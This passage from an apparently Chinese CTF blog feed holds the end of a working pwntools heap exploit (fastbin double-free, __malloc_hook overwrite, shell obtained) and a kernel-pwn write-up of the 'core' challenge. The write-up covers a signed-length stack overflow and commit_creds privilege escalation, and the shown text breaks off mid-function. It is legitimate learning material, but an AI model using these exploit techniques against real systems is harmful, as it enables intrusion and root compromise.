<span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"choice:"</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"delete?"</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>

add<span class="token punctuation">(</span><span class="token string">"aaa"</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'N'</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'Y'</span><span class="token punctuation">)</span>
show<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">#gdb.attach(p)</span>
p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>
__realloc_hook_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">2</span>
<span class="token keyword">print</span> hex<span class="token punctuation">(</span>__realloc_hook_addr<span class="token punctuation">)</span>
libc_base <span class="token operator">=</span>__realloc_hook_addr<span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__realloc_hook'</span><span class="token punctuation">]</span>
<span class="token keyword">print</span> hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span>
malloc_addr <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span><span class="token operator">+</span>libc_base
ret_malloc <span class="token operator">=</span> malloc_addr<span class="token number">-0x13</span>
<span class="token keyword">print</span> <span class="token string">'ret_malloc_addr:'</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>ret_malloc<span class="token punctuation">)</span>
__memalign_hook <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__memalign_hook'</span><span class="token punctuation">]</span><span class="token operator">+</span>libc_base
_IO_2_1_stdin_ <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'_IO_2_1_stdin_'</span><span class="token punctuation">]</span><span class="token operator">+</span>libc_base
<span class="token keyword">print</span> <span class="token string">"malloc_addr:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>malloc_addr<span class="token punctuation">)</span>
one_gadget<span class="token operator">=</span>libc_base<span class="token operator">+</span><span class="token number">0xf02a4</span>
<span class="token keyword">print</span> hex<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token string">"aaa"</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'Y'</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token string">"bbb"</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'Y'</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token string">"ccc"</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'Y'</span><span class="token punctuation">)</span>

delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>

add<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>malloc_addr<span class="token number">-0x23</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span> <span class="token string">"nnnn:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>malloc_addr<span class="token number">-0x23</span><span class="token punctuation">)</span>
gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'Y'</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token string">"ddd"</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'Y'</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token string">"eee"</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'Y'</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">#gdb.attach(p)</span>
add<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x13</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'Y'</span><span class="token punctuation">)</span>

delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p>成功拿到shell</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">$ <span class="token function">ls</span>
<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent 0x3 bytes:
    <span class="token string">'ls\n'</span>
<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received 0xbb bytes:
    <span class="token string">'core\t   Downloads\t     littlenote  one_gadget  pwntools\ttest.c\tVideos\n'</span>
    <span class="token string">'Desktop    examples.desktop  lt.py\t Pictures    te\t\tuaf\n'</span>
    <span class="token string">'Documents  libc.so.6\t     Music\t Public      Templates\tuaf.c\n'</span>
core       Downloads         littlenote  one_gadget  pwntools    test.c    Videos
Desktop    examples.desktop  lt.py     Pictures    te        uaf
Documents  libc.so.6         Music     Public      Templates    uaf.c
$
</code></pre>
<p> 推荐文章</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;迷途指针、野指针、空指针&lt;/p&gt;
&lt;p&gt;&lt;/p&gt;&lt;p class=&quot;code-caption&quot; data-lang=&quot;&quot; data-line_number=&quot;frontend&quot; data-trim_indent=&quot;backend&quot; data-label_position=&quot;
    
    </summary>
    
    
      <category term="Fastbin_Attack" scheme="http://iosmosis.github.io/tags/Fastbin-Attack/"/>
    
      <category term="Heap" scheme="http://iosmosis.github.io/tags/Heap/"/>
    
  </entry>
  
  <entry>
    <title>kernel学习-core</title>
    <link href="http://iosmosis.github.io/2018/11/18/kernel-core/"/>
    <id>http://iosmosis.github.io/2018/11/18/kernel-core/</id>
    <published>2018-11-18T15:27:12.000Z</published>
    <updated>2018-11-29T08:00:32.000Z</updated>
    
    <content type="html"><![CDATA[<p>感谢CTF-wiki、P4nda、Veritas501  收获很大</p>
<p>首先捋清kernel pwn 与 用户态下的pwn的区别</p>
<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>正常用户态pwn 控制流程以后 跳转到 bin/sh 就可以了

而kernel pwn 还需要维护堆栈平衡  目的从取得shell变成了取得root权限shell
</code></pre><h3 id="现代操作系统的权限分离"><a href="#现代操作系统的权限分离" class="headerlink" title="现代操作系统的权限分离"></a>现代操作系统的权限分离</h3><p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>现代操作系统一般都至少分为内核态和用户态。一般应用程序通常运行于用户态，而当应用程序调用系统调用时候会执行内核代码，此时会处于内核态。一般的，应用程序是不能随便进入内核态的而是需要向OS申请，因为内核态拥有更高的权限。所以当程序运行的时候，其实是有两个栈的，一个位于用户态，一个位于内核态。他们之间会按照操作系统的规定进行通信
</code></pre><p>内核栈和用户栈分别处于内核空间和用户空间两个不同的空间中，因此，这两个栈是相互独立的，所以参数传递不能只是简单的压栈出栈，因此，Linux内核中主要是才用寄存器的方式来完成这个任务。</p>
<h3 id="intel的x86架构分级"><a href="#intel的x86架构分级" class="headerlink" title="intel的x86架构分级"></a>intel的x86架构分级</h3><p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>Intel x86架构使用了4个级别来标明不同的特权级权限。R0实际就是内核态，拥有最高权限。而一般应用程序处于R3状态--用户态。在Linux中，还存在R1和R2两个级别，一般归属驱动程序的级别。在Windows平台没有R1和R2两个级别，只用R0内核态和R3用户态。在权限约束上，使用的是高特权等级状态可以阅读低等级状态的数据，例如进程上下文、代码、数据等等，但是反之则不可。R0最高可以读取R0-3所有的内容，R1可以读R1-3的，R2以此类推，R3只能读自己的数据。因为shelllog应该写在内核中
</code></pre><h3 id="什么是ioctl"><a href="#什么是ioctl" class="headerlink" title="什么是ioctl"></a>什么是ioctl</h3><p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>ioctl是设备驱动程序中对设备的I/O通道进行管理的函数。所谓对I/O通道进行管理，就是对设备的一些特性进行控制，例如串口的传输波特率、马达的转速等等。它的调用个数如下： 
int ioctl(int fd, ind cmd, …)； 
    其中fd是用户程序打开设备时使用open函数返回的文件标示符，cmd是用户程序对设备的控制命令，至于后面的省略号，那是一些补充参数，一般最多一个，这个参数的有无和cmd的意义相关。 
    ioctl函数是文件结构中的一个属性分量，就是说如果你的驱动程序提供了对ioctl的支持，用户就可以在用户程序中使用ioctl函数来控制设备的I/O通道。
    在驱动程序中实现的ioctl函数体内，实际上是有一个switch{case}结构，每一个case对应一个命令码，做出一些相应的操作
</code></pre><p>具体解释：<a href="https://www.cnblogs.com/tdyizhen1314/p/4896689.html" target="_blank" rel="noopener">ioctl</a> </p>
<h3 id="swapgs"><a href="#swapgs" class="headerlink" title="swapgs"></a>swapgs</h3><p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>调用swapgs命令，在gs寄存器的内核与用户态值之间切换，为离开内核做准备
</code></pre><h3 id="中断返回指令"><a href="#中断返回指令" class="headerlink" title="中断返回指令"></a>中断返回指令</h3><p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>发生系统调用时，这是处于用户态的进程主动请求切换到内核态的一种方式。用户态的进程通过系统调用申请使用操作系统提供的系统调用服务例程来处理任务。而系统调用的机制，其核心仍是使用了操作系统为用户特别开发的一个中断机制来实现的，即软中断。

当一个中断服务程序执行完毕时，CPU将恢复被中断的现场，返回到引起中断的程序中。为了实现此项功能，指令系统提供了一条专用的中断返回指令。该指令的格式如下：
IRET/IRETD
该指令执行的过程基本上是INT指令的逆过程，具体如下：
1.从栈顶弹出内容送入IP；
2.再从新栈顶弹出内容送入CS；
3.再从新栈顶弹出内容送入标志寄存器；
</code></pre><h2 id="CORE"><a href="#CORE" class="headerlink" title="CORE"></a>CORE</h2><p>下载下来题目 查看下目录</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">➜  give_to_player <span class="token function">ls</span>
bzImage  core.cpio  leak.py   vmlinux      vmlinux.id1  vmlinux.nam
core     gdb.sh     start.sh  vmlinux.id0  vmlinux.id2  vmlinux.til
</code></pre>
<p>去除ida调试文件 主要有以下文件</p>
<p>bzImage ：可以理解为压缩后的kernel文件 //可利用./extract-vmlinux ./bzImage &gt; vmlinux 提取静态kernel文件<br>core.cpio：打包好的磁盘文件<br>vmlinux ：静态kernel文件 //可以直接在此中查找gadget<br>start.sh：启动环境</p>
<p>根据p4nda师傅理解<br>*.ko就是binary文件，vmlinux就是libc … 不同的是保护机制是由如何启动决定的<br>查看下start.sh</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">➜  give_to_player <span class="token function">cat</span> start.sh 
qemu-system-x86_64 \
-m 128M \           原本这里给的64M导致 环境无法运行 可以修改大于64M即可
-kernel ./bzImage \
-initrd  ./core.cpio \
-append <span class="token string">"root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr"</span> \
-s  \                      这里设置了默认的gdb调试端口 1234
-netdev user,id<span class="token operator">=</span>t0, -device e1000,netdev<span class="token operator">=</span>t0,id<span class="token operator">=</span>nic0 \
-nographic  \
</code></pre>
<p>发现环境开启了kaslr 未开启smep<br>解包下core.cpio</p>
<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>mkdir core 

mv core.cpio ./core/core.cpio.gz 

cd core

gunzip core.cpio.gz 

cpio -idmv &lt; core.cpio

ls

➜  core ls
bin       core.id2  core.til     init   linuxrc  sbin  usr
core.id0  core.ko   etc          lib    proc     sys   vmlinux
core.id1  core.nam  gen_cpio.sh  lib64  root     tmp
</code></pre><p>除去ida调试文件<br>可以看到我们的驱动文件<br>core.ko<br>以及磁盘其他目录<br>查看下init</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">➜  core <span class="token function">cat</span> init
<span class="token comment" spellcheck="true">#!/bin/sh</span>
<span class="token function">mount</span> -t proc proc /proc
<span class="token function">mount</span> -t sysfs sysfs /sys
<span class="token function">mount</span> -t devtmpfs none /dev
/sbin/mdev -s
<span class="token function">mkdir</span> -p /dev/pts
<span class="token function">mount</span> -vt devpts -o gid<span class="token operator">=</span>4,mode<span class="token operator">=</span>620 none /dev/pts
<span class="token function">chmod</span> 666 /dev/ptmx
<span class="token function">cat</span> /proc/kallsyms <span class="token operator">></span> /tmp/kallsyms
<span class="token keyword">echo</span> 1 <span class="token operator">></span> /proc/sys/kernel/kptr_restrict
<span class="token keyword">echo</span> 1 <span class="token operator">></span> /proc/sys/kernel/dmesg_restrict
<span class="token function">ifconfig</span> eth0 up
udhcpc -i eth0
<span class="token function">ifconfig</span> eth0 10.0.2.15 netmask 255.255.255.0
route add default gw 10.0.2.2 
insmod /core.ko
 poweroff -d 120 -f <span class="token operator">&amp;</span>
setsid /bin/cttyhack setuidgid 1000 /bin/sh
<span class="token keyword">echo</span> <span class="token string">'sh end!\n'</span>
<span class="token function">umount</span> /proc
<span class="token function">umount</span> /sys

poweroff -d 0  -f
</code></pre>
<p>看到 程序将/proc/kallsyms写入了 /tmp/kallsyms 并且使kptr_restrict 设置为1导致不能直接通过/proc/kallsyms 查找commit_creds，prepare_kernel_cred<br>但是可以通过/tmp/kallsyms  中查找获取</p>
<p>接着可以看到  poweroff -d 120 -f &amp; 设置了定时关机 这里删除就可以防止自动关机</p>
<h3 id="打包命令"><a href="#打包命令" class="headerlink" title="打包命令"></a>打包命令</h3><p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>由于题目提供了打包脚本 gen_cpio.sh

➜  core cat gen_cpio.sh
find . -print0 \
| cpio --null -ov --format=newc \
| gzip -9 &gt; $1
 #$1 就是我们打包后的命名
./gen_cpio.sh core.cpio
.
......
......
./lib64/libm.so.6
./lib64/ld-linux-x86-64.so.2
./lib64/libc.so.6
./sys
125596 块
接着 
mv core.cpio ../
重启 kernel即可
</code></pre><p>我们写好的exp 也放在解包后的目录里，接着重新打包运行即可在虚拟机里查看到exp</p>
<h3 id="gdb远程调式问题"><a href="#gdb远程调式问题" class="headerlink" title="gdb远程调式问题"></a>gdb远程调式问题</h3><p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>target remote localhost:1234
</code></pre><p>通过 gdb ./vmlinux 启动时，虽然加载了 kernel 的符号表，但没有加载驱动 core.ko 的符号表，可以通过 add-symbol-file core.ko textaddr 加载<br>.text 段的地址可以通过 /sys/modules/core/section/.text 来查看</p>
<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>/ $ cat /sys/module/core/sections/.text
cat: can&#39;t open &#39;/sys/module/core/sections/.text&#39;: Permission denied
</code></pre><p>缺少权限<br>需要重新配置init </p>
<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>➜  core cat init
#!/bin/sh
mount -t proc proc /proc
mount -t sysfs sysfs /sys
mount -t devtmpfs none /dev
/sbin/mdev -s
mkdir -p /dev/pts
mount -vt devpts -o gid=4,mode=620 none /dev/pts
chmod 666 /dev/ptmx
cat /proc/kallsyms &gt; /tmp/kallsyms
echo 1 &gt; /proc/sys/kernel/kptr_restrict
echo 1 &gt; /proc/sys/kernel/dmesg_restrict
ifconfig eth0 up
udhcpc -i eth0
ifconfig eth0 10.0.2.15 netmask 255.255.255.0
route add default gw 10.0.2.2 
insmod /core.ko

#setsid /bin/cttyhack setuidgid 1000 /bin/sh
setsid /bin/cttyhack setuidgid 0 /bin/sh
echo &#39;sh end!\n&#39;
umount /proc
umount /sys

poweroff -d 0  -f
</code></pre><p>重新打包</p>
<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>➜  core ./gen_cpio.sh core.cpio
.
./vmlinux
........
........
./lib64/ld-linux-x86-64.so.2
./lib64/libc.so.6
./sys
125596 块

➜  core mv core.cpio ../
➜  give_to_player ./start.sh
</code></pre><p>再次查看</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">➜  <span class="token function">cat</span> /sys/module/core/sections/.text
0xffffffffc028b000
</code></pre>
<p>所以加载 符号表</p>
<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>pwndbg&gt; add-symbol-file ./core/core.ko 0xffffffffc028b000
add symbol table from file &quot;./core/core.ko&quot; at
    .text_addr = 0xffffffffc028b000
Reading symbols from ./core/core.ko...(no debugging symbols found)...done.
</code></pre><p>在core驱动下断</p>
<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>pwndbg&gt; b core_read
</code></pre><p>远程调试</p>
<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>target remote localhost:1234
c
</code></pre><h3 id="core-ko"><a href="#core-ko" class="headerlink" title="core.ko"></a>core.ko</h3><p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c">__int64 __fastcall <span class="token function">core_ioctl</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> __int64 a2<span class="token punctuation">,</span> __int64 a3<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  __int64 v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rbx</span>

  v3 <span class="token operator">=</span> a3<span class="token punctuation">;</span>
  <span class="token keyword">switch</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>_DWORD<span class="token punctuation">)</span>a2 <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token keyword">case</span> <span class="token number">0x6677889B</span><span class="token punctuation">:</span>
      <span class="token function">core_read</span><span class="token punctuation">(</span>a3<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token keyword">case</span> <span class="token number">0x6677889C</span><span class="token punctuation">:</span>
      <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_2CD<span class="token punctuation">,</span> a3<span class="token punctuation">)</span><span class="token punctuation">;</span>
      off <span class="token operator">=</span> v3<span class="token punctuation">;</span>
      <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token keyword">case</span> <span class="token number">0x6677889A</span><span class="token punctuation">:</span>
      <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_2B3<span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">core_copy_func</span><span class="token punctuation">(</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">break</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>可以看到这是自行定义的ioctl、并且全局变量可控<br>传入 0x6677889A进入core_copy_func函数<br>传入 0x6677889B 进入 core_read函数<br>传入  0x6677889C 设置off参数</p>
<h3 id="core-copy-func"><a href="#core-copy-func" class="headerlink" title="core_copy_func"></a>core_copy_func</h3><p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">signed</span> __int64 __fastcall <span class="token function">core_copy_func</span><span class="token punctuation">(</span><span class="token keyword">signed</span> __int64 a1<span class="token punctuation">,</span> __int64 a2<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">signed</span> __int64 result<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rax</span>
  __int64 v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp-50h] [rbp-50h]</span>
  <span class="token keyword">unsigned</span> __int64 v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp-10h] [rbp-10h]</span>

  v4 <span class="token operator">=</span> <span class="token function">__readgsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_215<span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> a1 <span class="token operator">></span> <span class="token number">63</span> <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_2A1<span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span>
    result <span class="token operator">=</span> <span class="token number">0xFFFFFFFFLL</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">else</span>
  <span class="token punctuation">{</span>
    result <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
    <span class="token function">qmemcpy</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v3<span class="token punctuation">,</span> <span class="token operator">&amp;</span>name<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int16<span class="token punctuation">)</span>a1<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> result<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>注意qmemcpy这里<br>在执行前 定义 signed <strong>int64 a1 但是在执行时unsigned </strong>int16)a1</p>
<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>signed和unsigned用于修饰整数类型（包括char，从ANSI C89标准开始支持）。
signed表示有符号，unsigned表示无符号。对应的有符号数的最大取值要比无符号的小约一半，因为最高一位被用来表示符号。
默认的int、short、long、long long为有符号数，也就是说，int等价于signed int，short等价于signed short，long等价于signed long，long long等价于signed long long。但是char本身是signed char还是unsigned char，取决于语言的实现（编译器）。
范围列表如下：
signed char：[-2^7, 2^7)即[-128, 128)；验证
unsigned char：[0, 2^8)即[0, 256)；
signed n位整数：[-2^(n-1), 2^(n-1))；
unsigned n位整数：[0, 2^n)。
注意整数类型占多少空间是不确定的，只能保证sizeof(shor)&lt;=sizeof(int)&lt;=sizeof(long)。一般32位平台上，int和long为32位，short为16位，long long为64位
</code></pre><p>所以这里可以传入负数导致溢出   因为需要利用溢出所以我们只需要控制构造长度为0xf000000000000300，即可成功覆盖RIP<br>因为没有开启smep 所以可以利用ret2user在用户态下提权或者在内核态rop进行提权<br>常见提权命令</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token function">commit_creds</span><span class="token punctuation">(</span><span class="token function">prepare_kernel_cred</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<h3 id="core-read"><a href="#core-read" class="headerlink" title="core_read"></a>core_read</h3><p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 __fastcall <span class="token function">core_read</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> __int64 a2<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  __int64 v2<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rbx</span>
  __int64 <span class="token operator">*</span>v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rdi</span>
  <span class="token keyword">signed</span> __int64 i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rcx</span>
  <span class="token keyword">unsigned</span> __int64 result<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rax</span>
  __int64 v6<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp-50h] [rbp-50h]</span>
  <span class="token keyword">unsigned</span> __int64 v7<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp-10h] [rbp-10h]</span>

  v2 <span class="token operator">=</span> a1<span class="token punctuation">;</span>
  v7 <span class="token operator">=</span> <span class="token function">__readgsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_25B<span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_275<span class="token punctuation">,</span> off<span class="token punctuation">)</span><span class="token punctuation">;</span>
  v3 <span class="token operator">=</span> <span class="token operator">&amp;</span>v6<span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">16LL</span><span class="token punctuation">;</span> i<span class="token punctuation">;</span> <span class="token operator">--</span>i <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>v3 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
